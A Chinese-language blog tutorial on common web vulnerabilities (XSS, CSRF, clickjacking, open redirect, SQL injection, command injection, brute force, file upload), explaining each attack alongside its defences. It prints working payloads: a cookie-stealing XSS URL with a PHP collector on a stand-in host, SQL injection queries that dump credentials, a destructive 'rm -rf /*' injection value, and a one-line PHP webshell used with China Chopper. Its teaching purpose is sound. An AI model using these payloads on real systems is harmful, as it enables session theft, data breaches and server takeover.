---
title:网络安全
categories:
- 
tags:
- 学习指南

date: 2019/07/15 23:47:41
---
一些常见安全漏洞

<!--more-->

## 一、XSS

XSS (Cross-Site Scripting)，跨站脚本攻击，因为缩写和 CSS重叠，所以只能叫 XSS。跨站脚本攻击是指通过存在安全漏洞的Web网站注册用户的浏览器内运行非法的HTML标签或JavaScript进行的一种攻击。

跨站脚本攻击有可能造成以下影响:

- 利用虚假输入表单骗取用户个人信息。
- 利用脚本窃取用户的Cookie值，被害者在不知情的情况下，帮助攻击者发送恶意请求。
- 显示伪造的文章或图片。

**XSS 的原理是恶意攻击者往 Web 页面里插入恶意可执行网页脚本代码，当用户浏览该页之时，嵌入其中 Web 里面的脚本代码会被执行，从而可以达到攻击者盗取用户信息或其他侵犯用户安全隐私的目的**。

**理论上，所有可输入的地方没有对输入数据进行处理的话，都会存在XSS漏洞，漏洞的危害取决于攻击代码的威力，攻击代码也不局限于script。**

XSS 的攻击方式千变万化，但还是可以大致细分为几种类型。

## 1.非持久型 XSS（反射型 XSS ）

非持久型 XSS 漏洞，一般是通过给别人发送**带有恶意脚本代码参数的 URL**，当 URL 地址被打开时，特有的恶意代码参数被 HTML 解析、执行。



![img](https://pic3.zhimg.com/80/v2-da3258e217ccc2b9cff316d97487f83e_hd.jpg)



举一个例子，比如页面中包含有以下代码：

```html
<select>
    <script>
        document.write(''
            + '<option value=1>'
            +     location.href.substring(location.href.indexOf('default=') + 8)
            + '</option>'
        );
        document.write('<option value=2>English</option>');
    </script>
</select>
```

攻击者可以直接通过 URL (类似：`https://xxx.com/xxx?default=<script>alert(document.cookie)</script>`) 注入可执行的脚本代码。不过一些浏览器如Chrome其内置了一些XSS过滤器，可以防止大部分反射型XSS攻击。

非持久型 XSS 漏洞攻击有以下几点特征：

- 即时性，不经过服务器存储，直接通过 HTTP 的 GET 和 POST 请求就能完成一次攻击，拿到用户隐私数据。
- 攻击者需要诱骗点击,必须要通过用户点击链接才能发起
- 反馈率低，所以较难发现和响应修复
- 盗取用户敏感保密信息

为了防止出现非持久型 XSS 漏洞，需要确保这么几件事情：

- Web 页面渲染的所有内容或者渲染的数据都必须来自于服务端。
- 尽量不要从 `URL`，`document.referrer`，`document.forms` 等这种 DOM API 中获取数据直接渲染。
- 尽量不要使用 `eval`, `new Function()`，`document.write()`，`document.writeln()`，`window.setInterval()`，`window.setTimeout()`，`innerHTML`，`document.createElement()`等可执行字符串的方法。
- 如果做不到以上几点，也必须对涉及 DOM 渲染的方法传入的字符串参数做 escape 转义。
- 前端渲染的时候对任何的字段都需要做 escape 转义编码。

## 2.持久型 XSS（存储型 XSS）

持久型 XSS 漏洞，一般存在于 Form 表单提交等交互功能，如文章留言，提交文本信息等，黑客利用的 XSS 漏洞，将内容经正常功能提交进入数据库持久保存，当前端页面获得后端从数据库中读出的注入代码时，恰好将其渲染执行。



![img](https://pic1.zhimg.com/80/v2-cf4f8235303f0892d2a50fe480b9d480_hd.jpg)



举个例子，对于评论功能来说，就得防范持久型 XSS 攻击，因为我可以在评论中输入以下内容



![img](https://pic1.zhimg.com/80/v2-73842ddf6a856a44c3d4364c49e5e108_hd.jpg)



主要注入页面方式和非持久型 XSS 漏洞类似，只不过持久型的不是来源于 URL，referer，forms 等，而是来源于**后端从数据库中读出来的数据** 。持久型 XSS 攻击不需要诱骗点击，黑客只需要在提交表单的地方完成注入即可，但是这种 XSS 攻击的成本相对还是很高。

攻击成功需要同时满足以下几个条件：

- POST 请求提交表单后端没做转义直接入库。
- 后端从数据库中取出数据没做转义直接输出给前端。
- 前端拿到后端数据没做转义直接渲染成 DOM。

持久型 XSS 有以下几个特点：

- 持久性，植入在数据库中
- 盗取用户敏感私密信息
- 危害面广

## 3.如何防御

对于 XSS 攻击来说，通常有两种方式可以用来防御。

**1) CSP**

CSP 本质上就是建立白名单，开发者明确告诉浏览器哪些外部资源可以加载和执行。我们只需要配置规则，如何拦截是由浏览器自己实现的。我们可以通过这种方式来尽量减少 XSS 攻击。

通常可以通过两种方式来开启 CSP：

- 设置 HTTP Header 中的 Content-Security-Policy
- 设置 meta 标签的方式

这里以设置 HTTP Header 来举例：

- 只允许加载本站资源

```text
Content-Security-Policy: default-src 'self'
```

- 只允许加载 HTTPS 协议图片

```text
Content-Security-Policy: img-src https://*
```

- 允许加载任何来源框架

```text
Content-Security-Policy: child-src 'none'
```

如需了解更多属性，请查看[Content-Security-Policy文档](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy)

对于这种方式来说，只要开发者配置了正确的规则，那么即使网站存在漏洞，攻击者也不能执行它的攻击代码，并且 CSP 的兼容性也不错。

**2) 转义字符**

用户的输入永远不可信任的，最普遍的做法就是转义输入输出的内容，对于引号、尖括号、斜杠进行转义

```js
function escape(str) {
  str = str.replace(/&/g, '&amp;')
  str = str.replace(/</g, '&lt;')
  str = str.replace(/>/g, '&gt;')
  str = str.replace(/"/g, '&quto;')
  str = str.replace(/'/g, '&#39;')
  str = str.replace(/`/g, '&#96;')
  str = str.replace(/\//g, '&#x2F;')
  return str
}
```

但是对于显示富文本来说，显然不能通过上面的办法来转义所有字符，因为这样会把需要的格式也过滤掉。对于这种情况，通常采用白名单过滤的办法，当然也可以通过黑名单过滤，但是考虑到需要过滤的标签和标签属性实在太多，更加推荐使用白名单的方式。

```js
const xss = require('xss')
let html = xss('<h1 id="title">XSS Demo</h1><script>alert("xss");</script>')
// -> <h1>XSS Demo</h1>&lt;script&gt;alert("xss");&lt;/script&gt;
console.log(html)
```

以上示例使用了 js-xss 来实现，可以看到在输出中保留了 h1 标签且过滤了 script 标签。

**3) HttpOnly Cookie。**

这是预防XSS攻击窃取用户cookie最有效的防御手段。Web应用程序在设置cookie时，将其属性设为HttpOnly，就可以避免该网页的cookie被客户端恶意JavaScript窃取，保护用户cookie信息。

## 富文本编辑器中XSS攻击的防范

1.建立白名单就好，保留要用的标签，其他全部过滤

2.入数据库的时候 转义为实体字符，出库的时候还原，并过滤掉以下

```
<script></script>
javascript:xxx;
```

## XSS 跨站脚本攻击

Chrome浏览器默认开启xss监听，测试前须命令行启动浏览器，关闭监听。

```js
cd /Applications/Google Chrome.app/Contents/MacOS
./Google Chrome --disable-xss-auditor
```

**反射型**：非持久化，用户主动点击带有恶意URL，发送请求到后端，后端返回带有恶意脚本的页面。
假设某网站 [http://A.com](http://a.com/) 的某个输入框存在XSS漏洞，能通过输入框或者URL传入脚本执行。比如它的后端php代码是这样的

```php
echo 'Hello ' . $_GET[ 'name' ];
```

那么，就可以在 url中传入参数name。生成 **恶意url**：

```js
A.com/?name=<script>window.open('B.com/ck.php?c='+document.cookie)</script>
```

ck.php文件代码如下，将获得的cookie存入cookie.txt。

```text
$cookie = $_GET['c']; 
$ip = getenv ('REMOTE_ADDR'); 
$time=date("j F, Y, g:i a"); 
$referer=getenv ('HTTP_REFERER'); 
$fp = fopen('cookie.txt', 'a'); 
fwrite($fp, 'Cookie: '.$cookie."\n".'IP: '.$ip."\n".'Date and Time: '.$time."\n".'Referer: '.$referer."\n\n"); 
fclose($fp);
```

通过短域名生成网站,将上诉 **恶意 url** 映射成类似http://dwz.cn/B4l3Ydke的网址欺骗用户，发送给已经在[http://A.com](http://a.com/)登录的用户，用户点击之后，cookie信息就会自动保存到 [http://B.com](http://b.com/)下的cookie.txt中。

通常，后端不会这么如此信任用户输入，会对各种输入进行正则过滤限制。针对各种过滤出现了对应的恶意 payload, 通过事件、通过协议、通过请求。

```js
<Script> 恶意代码 </script>
<sc<script>ript> 恶意代码 </script>
<img onerror=" 恶意代码 " >
<div style="position:fixed;top:0;left:0;bottom:0;right:0;" onclick=" 恶意代码 "></div>
...
```

以下代码通过base64编码，依旧能实现恶意攻击。

```text
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgiMSIpOzwvc2NyaXB0Pg=="></object>
```

有效的解决方法是通过转义，通过 htmlspecialchars，将具有特殊意义的字符进行转义。

```js
&  变为 &amp;
"  变为 &quot;
'  变为 &#039;
<  变为 &lt;
>  变为 &gt;
```

**存储型**：持久型，攻击者提交恶意脚本最终进入到数据库，用户访问加载页面时，恶意脚本执行。

区别于存储型XSS 攻击，脚本因为存入数据库导致危害更大，所有访问该页面的用户都将被攻击。但因为业务需要比如富文本框功能，就不能一味的使用 htmlspecialchars 转义，而应该自定义过滤规则，将内容限制在安全范围内。

```js
放行常见标签及img标签以实现富文本功能。
对script,iframe,form标签,on开头的属性,href属性等进行过滤。
```

**DOM型**:客户端脚本通过DOM动态输出数据到页面，而不经过服务器。 当前端出现以下代码时，就要小心了，确保等号右边的内容可控。

```js
document.write = 
innerHTML = 
eval()

// 不好的例子
if (document.location.href.indexOf("default=") >= 0) {
var lang = document.location.href.substring(document.location.href.indexOf("default=")+8);
document.write("<option value='" + lang + "'></option>");
}

// 此时可以通过以下payload注入
A.com?default=German#<script> 恶意代码 </script>
```

**大部分xss都是为了获得cookie，进行下一步的破坏，因此系统层面也应考虑cookie有效期，HttpOnly等方式。**

## 二、CSRF

CSRF(Cross Site Request Forgery)，即跨站请求伪造，是一种常见的Web攻击，它利用用户已登录的身份，在用户毫不知情的情况下，以用户的名义完成非法操作。

## 1. CSRF攻击的原理

下面先介绍一下CSRF攻击的原理：



![img](https://pic1.zhimg.com/80/v2-226050bcad33410428e71165b2410440_hd.jpg)



![img](https://pic3.zhimg.com/80/v2-5f5c6de58fcbc58703b3a3d83284e942_hd.jpg)

完成 CSRF 攻击必须要有三个条件：

- 用户已经登录了站点 A，并在本地记录了 cookie
- 在用户没有登出站点 A 的情况下（也就是 cookie 生效的情况下），访问了恶意攻击者提供的引诱危险站点 B (B 站点要求访问站点A)。
- 站点 A 没有做任何 CSRF 防御

我们来看一个例子： 当我们登入转账页面后，突然眼前一亮**惊现”XXX隐私照片，不看后悔一辈子”的链接**，耐不住内心躁动，立马点击了该危险的网站（页面代码如下图所示），但当这页面一加载，便会执行`submitForm`这个方法来提交转账请求，从而将10块转给黑客。



![img](https://pic1.zhimg.com/80/v2-c549af63c3f0a490c9c24b5ce21155c8_hd.jpg)



## 2.如何防御

防范 CSRF 攻击可以遵循以下几种规则：

- Get 请求不对数据进行修改
- 不让第三方网站访问到用户 Cookie
- 阻止第三方网站请求接口
- 请求时附带验证信息，比如验证码或者 Token

**1) SameSite**

可以对 Cookie 设置 SameSite 属性。该属性表示 Cookie 不随着跨域请求发送，可以很大程度减少 CSRF 的攻击，但是该属性目前并不是所有浏览器都兼容。

**2) Referer Check**

HTTP Referer是header的一部分，当浏览器向web服务器发送请求时，一般会带上Referer信息告诉服务器是从哪个页面链接过来的，服务器籍此可以获得一些信息用于处理。可以通过检查请求的来源来防御CSRF攻击。正常请求的referer具有一定规律，如在提交表单的referer必定是在该页面发起的请求。所以**通过检查http包头referer的值是不是这个页面，来判断是不是CSRF攻击**。

但在某些情况下如从https跳转到http，浏览器处于安全考虑，不会发送referer，服务器就无法进行check了。若与该网站同域的其他网站有XSS漏洞，那么攻击者可以在其他网站注入恶意脚本，受害者进入了此类同域的网址，也会遭受攻击。出于以上原因，无法完全依赖Referer Check作为防御CSRF的主要手段。但是可以通过Referer Check来监控CSRF攻击的发生。

**3) Anti CSRF Token**

目前比较完善的解决方案是加入Anti-CSRF-Token。即发送请求时在HTTP 请求中以参数的形式加入一个随机产生的token，并在服务器建立一个拦截器来验证这个token。服务器读取浏览器当前域cookie中这个token值，会进行校验该请求当中的token和cookie当中的token值是否都存在且相等，才认为这是合法的请求。否则认为这次请求是违法的，拒绝该次服务。

**这种方法相比Referer检查要安全很多**，token可以在用户登陆后产生并放于session或cookie中，然后在每次请求时服务器把token从session或cookie中拿出，与本次请求中的token 进行比对。由于token的存在，攻击者无法再构造出一个完整的URL实施CSRF攻击。但在处理多个页面共存问题时，当某个页面消耗掉token后，其他页面的表单保存的还是被消耗掉的那个token，其他页面的表单提交时会出现token错误。

**防范**

token：服务端预先生成一个随机数，在渲染具有表单的页面时将随机数以不可见的形式( visible:hidden )插入到表单域，客户端请求时带上这个随机数，服务端进行校验，确定请求确实来自该页面。

对于B网站，即使请求会带上cookie，也由于获取不到该随机数（该随机数每次刷新页面都不一致），导致后端校验失败。

**4) 验证码**

应用程序和用户进行交互过程中，特别是账户交易这种核心步骤，强制用户输入验证码，才能完成最终请求。在通常情况下，验证码够很好地遏制CSRF攻击。**但增加验证码降低了用户的体验，网站不能给所有的操作都加上验证码**。所以只能将验证码作为一种辅助手段，在关键业务点设置验证码。

## 三、点击劫持

点击劫持是一种视觉欺骗的攻击手段。攻击者将需要攻击的网站通过 iframe 嵌套的方式嵌入自己的网页中，并将 iframe 设置为透明，在页面中透出一个按钮诱导用户点击。

## 1. 特点

- 隐蔽性较高，骗取用户操作
- “UI-覆盖攻击”
- 利用iframe或者其它标签的属性

## 2. 点击劫持的原理

用户在登陆 A 网站的系统后，被攻击者诱惑打开第三方网站，而第三方网站通过 iframe 引入了 A 网站的页面内容，用户在第三方网站中点击某个按钮（被装饰的按钮），实际上是点击了 A 网站的按钮。
接下来我们举个例子：我在优酷发布了很多视频，想让更多的人关注它，就可以通过点击劫持来实现

```html
iframe {
width: 1440px;
height: 900px;
position: absolute;
top: -0px;
left: -0px;
z-index: 2;
-moz-opacity: 0;
opacity: 0;
filter: alpha(opacity=0);
}
button {
position: absolute;
top: 270px;
left: 1150px;
z-index: 1;
width: 90px;
height:40px;
}
</style>
......
<button>点击脱衣</button>
<img src="http://pic1.win4000.com/wallpaper/2018-03-19/5aaf2bf0122d2.jpg">
<iframe src="http://i.youku.com/u/UMjA0NTg4Njcy" scrolling="no"></iframe>
```



![img](https://pic2.zhimg.com/80/v2-f707cdf092aa93c96b584466cac8b69d_hd.jpg)



从上图可知，攻击者通过图片作为页面背景，隐藏了用户操作的真实界面，当你按耐不住好奇点击按钮以后，真正的点击的其实是隐藏的那个页面的订阅按钮，然后就会在你不知情的情况下订阅了。



![img](https://pic1.zhimg.com/80/v2-ad9ead59259fbb7a7cd5b271961e02d4_hd.jpg)



## 3. 如何防御

**1）X-FRAME-OPTIONS**

`X-FRAME-OPTIONS`是一个 HTTP 响应头，在现代浏览器有一个很好的支持。这个 HTTP 响应头 就是为了防御用 iframe 嵌套的点击劫持攻击。

该响应头有三个值可选，分别是

- DENY，表示页面不允许通过 iframe 的方式展示
- SAMEORIGIN，表示页面可以在相同域名下通过 iframe 的方式展示
- ALLOW-FROM，表示页面可以在指定来源的 iframe 中展示

**2）JavaScript 防御**

对于某些远古浏览器来说，并不能支持上面的这种方式，那我们只有通过 JS 的方式来防御点击劫持了。

```html
<head>
  <style id="click-jack">
    html {
      display: none !important;
    }
  </style>
</head>
<body>
  <script>
    if (self == top) {
      var style = document.getElementById('click-jack')
      document.body.removeChild(style)
    } else {
      top.location = self.location
    }
  </script>
</body>
```

以上代码的作用就是当通过 iframe 的方式加载页面时，攻击者的网页直接不显示所有内容了。

**给大家推荐一个好用的BUG监控工具Fundebug，欢迎免费试用！**

## 四、URL跳转漏洞

定义：借助未验证的URL跳转，将应用程序引导到不安全的第三方区域，从而导致的安全问题。

## 1.URL跳转漏洞原理

黑客利用URL跳转漏洞来诱导安全意识低的用户点击，导致用户信息泄露或者资金的流失。其原理是黑客构建恶意链接(链接需要进行伪装,尽可能迷惑),发在QQ群或者是浏览量多的贴吧/论坛中。
安全意识低的用户点击后,经过服务器或者浏览器解析后，跳到恶意的网站中。



![img](https://pic4.zhimg.com/80/v2-eeef7a581d7287456102267effd983ab_hd.jpg)



恶意链接需要进行伪装,经常的做法是熟悉的链接后面加上一个恶意的网址，这样才迷惑用户。



![img](https://pic1.zhimg.com/80/v2-dcd9762b8ded41ecc3c898298716a620_hd.jpg)



诸如伪装成像如下的网址，你是否能够识别出来是恶意网址呢？

```text
http://gate.baidu.com/index?act=go&url=http://t.cn/RVTatrd
http://qt.qq.com/safecheck.html?flag=1&url=http://t.cn/RVTatrd
http://tieba.baidu.com/f/user/passport?jumpUrl=http://t.cn/RVTatrd
```

## 2.实现方式：

- Header头跳转
- Javascript跳转
- META标签跳转

这里我们举个Header头跳转实现方式：

```php
<?php
$url=$_GET['jumpto'];
header("Location: $url");
?>
http://www.wooyun.org/login.php?jumpto=http://www.evil.com
```

这里用户会认为`www.wooyun.org`都是可信的，但是点击上述链接将导致用户最终访问`www.evil.com`这个恶意网址。

## 3.如何防御

**1)referer的限制**

如果确定传递URL参数进入的来源，我们可以通过该方式实现安全限制，保证该URL的有效性，避免恶意用户自己生成跳转链接

**2)加入有效性验证Token**

我们保证所有生成的链接都是来自于我们可信域的，通过在生成的链接里加入用户不可控的Token对生成的链接进行校验，可以避免用户生成自己的恶意链接从而被利用，但是如果功能本身要求比较开放，可能导致有一定的限制。

## 五、SQL注入

SQL注入是一种常见的Web安全漏洞，攻击者利用这个漏洞，可以访问或修改数据，或者利用潜在的数据库漏洞进行攻击。

## 1.SQL注入的原理

我们先举一个万能钥匙的例子来说明其原理：



![img](https://pic1.zhimg.com/80/v2-25fab61ba77534f745fa6272234b593c_hd.jpg)



```html
<form action="/login" method="POST">
    <p>Username: <input type="text" name="username" /></p>
    <p>Password: <input type="password" name="password" /></p>
    <p><input type="submit" value="登陆" /></p>
</form>
```

后端的 SQL 语句可能是如下这样的：

```js
let querySQL = `
    SELECT *
    FROM user
    WHERE username='${username}'
    AND psw='${password}'
`;
// 接下来就是执行 sql 语句...
```

这是我们经常见到的登录页面，但如果有一个恶意攻击者输入的用户名是 `admin' --`，密码随意输入，就可以直接登入系统了。why! —-这就是SQL注入

我们之前预想的SQL 语句是:

```sql
SELECT * FROM user WHERE username='admin' AND psw='password'
```

但是恶意攻击者用奇怪用户名将你的 SQL 语句变成了如下形式：

```sql
SELECT * FROM user WHERE username='admin' --' AND psw='xxxx'
```

在 SQL 中,`' --`是闭合和注释的意思，– 是注释后面的内容的意思，所以查询语句就变成了：

```sql
SELECT * FROM user WHERE username='admin'
```

所谓的万能密码,本质上就是SQL注入的一种利用方式。

一次SQL注入的过程包括以下几个过程：

- 获取用户请求参数
- 拼接到代码当中
- SQL语句按照我们构造参数的语义执行成功

**SQL注入的必备条件：**
**1.可以控制输入的数据**
**2.服务器要执行的代码拼接了控制的数据**。



![img](https://pic4.zhimg.com/80/v2-be9253c625dcb1353567372d0165bf57_hd.jpg)



我们会发现SQL注入流程中与正常请求服务器类似，只是黑客控制了数据，构造了SQL查询，而正常的请求不会SQL查询这一步，**SQL注入的本质:数据和代码未分离，即数据当做了代码来执行。**

假如网站后端代码如下：

```text
$id = $_REQUEST[ 'id' ];
"SELECT first_name, last_name FROM users WHERE user_id = '$id';";
```

即 将获得id参数值，组合成SQL语句进行查询，那么就存在SQL注入的风险。

1. 攻击者通过将 id 参数设置为 1'or'1'='1 。'或' 语法使得 WHERE 条件一直成立，结果能查询出users表的所有数据。
2. id 设置为 1' order by n # ，要求结果以表的第n个字段排序，则当n = 1,2,3...依次执行，出现报错时假设n=5，即说明该表只有4个字段。
3. 通过以下 sql 能挖掘出更多的数据库信息。

```text
查询数据库用户，版本信息:
1' union select 1,concat(database(),version(),user()) #

查询所有数据库名字:
1' union select 1,schema_name from information_schema.schemata #

查询数据库的表名，0x64767761十六进制转字符为 dvwa:
' union select 1,table_name from information_schema.tables where table_schema=0x64767761 #

查询表的字段，0x7573657273十六进制转字符为 users:
' union select 1,column_name from information_schema.columns where table_name=0x7573657273 #

查看表的内容:
' union select user,password from users #
```

## 2.危害

- 获取数据库信息

- - 管理员后台用户名和密码
  - 获取其他数据库敏感信息：用户名、密码、手机号码、身份证、银行卡信息……
  - 整个数据库：脱裤



- 获取服务器权限
- 植入Webshell，获取服务器后门
- 读取服务器敏感文件

## 3.如何防御

- **严格限制Web应用的数据库的操作权限**，给此用户提供仅仅能够满足其工作的最低权限，从而最大限度的减少注入攻击对数据库的危害
- **后端代码检查输入的数据是否符合预期**，严格限制变量的类型，例如使用正则表达式进行一些匹配处理。
- **对进入数据库的特殊字符（’，”，，<，>，&，\*，; 等）进行转义处理，或编码转换**。基本上所有的后端语言都有对字符串进行转义处理的方法，比如 lodash 的 lodash._escapehtmlchar 库。
- **所有的查询语句建议使用数据库提供的参数化查询接口**，参数化的语句使用参数而不是将用户输入变量嵌入到 SQL 语句中，即不要直接拼接 SQL 语句。例如 Node.js 中的 mysqljs 库的 query 方法中的 ? 占位参数。

## 六、OS命令注入攻击

OS命令注入和SQL注入差不多，只不过SQL注入是针对数据库的，而OS命令注入是针对操作系统的。OS命令注入攻击指通过Web应用，执行非法的操作系统命令达到攻击的目的。只要在能调用Shell函数的地方就有存在被攻击的风险。倘若调用Shell时存在疏漏，就可以执行插入的非法命令。

命令注入攻击可以向Shell发送命令，让Windows或Linux操作系统的命令行启动程序。也就是说，通过命令注入攻击可执行操作系统上安装着的各种程序。

## 1.原理



![img](https://pic1.zhimg.com/80/v2-78f3e30a0c902152067da516a1039938_hd.jpg)



黑客构造命令提交给web应用程序，web应用程序提取黑客构造的命令，拼接到被执行的命令中，因黑客注入的命令打破了原有命令结构，导致web应用执行了额外的命令，最后web应用程序将执行的结果输出到响应页面中。

我们通过一个例子来说明其原理，假如需要实现一个需求：用户提交一些内容到服务器，然后在服务器执行一些系统命令去返回一个结果给用户

```js
// 以 Node.js 为例，假如在接口中需要从 github 下载用户指定的 repo
const exec = require('mz/child_process').exec;
let params = {/* 用户输入的参数 */};
exec(`git clone ${params.repo} /some/path`);
```

如果 `params.repo` 传入的是 `https://github.com/admin/admin.github.io.git` 确实能从指定的 git repo 上下载到想要的代码。
但是如果 `params.repo` 传入的是 `https://github.com/xx/xx.git && rm -rf /* &&` 恰好你的服务是用 root 权限起的就糟糕了。

## 2.如何防御

- 后端对前端提交内容进行规则限制（比如正则表达式）。
- 在调用系统命令前对所有传入参数进行命令行参数转义过滤。
- 不要直接拼接命令语句，借助一些工具做拼接、转义预处理，例如 Node.js 的 `shell-escape npm`包



## 暴力破解

本质上就是将密码字典的每一种情况，通过自动化工具进行组合尝试，进而得到密码字典中正确的一项。

**演示登录破解**

\- 安装Burp Suite（以下简称BS）,设置代理，使得 BS 能够拦截浏览器请求，捕获登录的数据包。 - 进入待破解网站A，BS开启拦截，输入账号密码点击登陆，此时请求会由BS控制，如下图所示:

![img](https://pic3.zhimg.com/80/v2-a5360fba67b2b26fa0f118e77e4434aa_hd.jpg)

\- 复制Raw数据包到 Intruder 页面，设置数据包中的账号和密码的占位（Add $），在 Payloads 中加载本地字典，Attack type选择Cluster bomb，这样每次请求就会从字典中依次加载字符串作为账号和密码去请求。如下图:

![img](https://pic4.zhimg.com/80/v2-1f3a0e8522f0b9d7edd5d110d14564f7_hd.jpg)

\- 开始攻击之前设置 Option ，便于我们快速找出登录成功的账号密码。经过分析，A网站登录无论正确错误都会返回302状态码，区别在于正确时返回头Location字段为 index.php，错误时为 login.php。 - 设置Grep Match，新增"index.php"，即响应中包含字符串的账号密码组合将被打勾标记。设置Grep Extract，将响应中Location之后的内容都打印出来。如下图:

![img](https://pic3.zhimg.com/80/v2-988535b2a6d99f036bb965c39d140d42_hd.jpg)

\- 可见 admin 和 password 的组合即为正确账号密码。 为了快速出结果，演示中账号密码字典仅五种情况，5*5 = 25次即可确定是否能破解，实际应用中字典量远大于此。

**防范**

```text
1.复杂密码与密码加密
2.人机识别验证
3.接口请求次数限制
```

## 命令执行

应用有时需要调用一些执行系统命令的函数。如PHP中的 system,exec,shell_exec 等。

如下后台代码，将前端输入框的值作为参数传入，执行 ping 命令，并将执行结果打印。

```text
$cmd = shell_exec( 'ping  -c 4 ' . $target );
$html .= "<pre>{$cmd}</pre>";
```

此时可构造恶意输入值如下：

```text
baidu.com && whoami
baidu.com && cd ../ && pwd
baidu.com && cd ../ && ls
```

实际破坏中原不仅仅是 'ls' 这种无害的命令。

**防范**

```text
1.对Shell命令中的特殊符号进行替换，如'&'，'|'，';','||'等。
2.对于确定的输入，比如IP，明确限制输入值格式。
3.服务器权限设置。
```



## 文件上传

漏洞利用的三个**重要条件**：

```text
1.可以上传木马文件。
2.文件能被执行。
3.上传文件的路径可知。
```

**利用步骤**

- A网站允许上传任意文件，则构建如下**一句话脚本**，保存为 hack.php 上传到A网站。注意 apple 字符串，该字符串可任意设置。

```php
<?php
  eval($_POST['apple']);
?>
```

- 假设已知A网站上传的文件都在/uploads/目录下，可通过[http://A.com/uploads/hack.php](http://a.com/uploads/hack.php)访问该文件。
- 打开 **中国菜刀** 软件，该软件被安全软件报病毒，谨慎使用。
- 右键添加SHELL，填写 [http://A.com/uploads/hack.php](http://a.com/uploads/hack.php) 及 apple 字符串(与hack.php保持一致)，点击添加。如下图：

![img](https://pic1.zhimg.com/80/v2-310c95a5cc63e1526edd1548ea8b9178_hd.jpg)

- 如果请求成功，则可以读取服务器任意文件,以及运行虚拟终端。如下图：

![img](https://pic2.zhimg.com/80/v2-b9818e3cc9a6991dbc52b6813d3e03a9_hd.jpg)










## 参考资料

- [常见Web 安全攻防总结](https://zoumiaojiang.com/article/common-web-security/)
- [前端面试之道](https://juejin.im/book/5bdc715fe51d454e755f75ef)
- [图解Http](https://book.douban.com/subject/25863515/)
- [Web安全知多少](https://wetest.qq.com/lab/view/136.html)
- [web安全之点击劫持(clickjacking)](https://blog.csdn.net/qq_32523587/article/details/79613768)
- [URL重定向/跳转漏洞](http://drops.xmd5.com/static/drops/papers-58.html)
- [网易web白帽子](https://mooc.study.163.com/smartSpec/detail/1001227001.htm)

https://zhuanlan.zhihu.com/p/56122850

https://zhuanlan.zhihu.com/p/43292233